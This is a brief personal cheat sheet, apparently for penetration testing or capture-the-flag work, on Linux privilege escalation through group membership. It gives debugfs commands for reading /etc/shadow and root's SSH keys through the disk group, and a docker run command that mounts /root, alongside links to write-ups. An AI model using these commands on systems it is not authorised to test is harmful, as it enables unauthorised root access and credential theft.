Last update: 2025.10.22
### Group Abuses:
#### `disk`:
Ref: https://www.hackingarticles.in/disk-group-privilege-escalation/
Disk space summary: `df -h` (find the one mounted to `/`)
DebugFS: `debugfs <partition>` (usually `/dev/sda2`)
Read files: `/root/.ssh/authorized_keys`; `/etc/shadow`

#### `lxc` & `lxd`:
TODO
Ref: https://ch3ng625.github.io/brainfuck

#### `docker`:
- `docker run -v /root:/mnt -it ubuntu`

#### `adm`:
- View logs in `/var/log`

---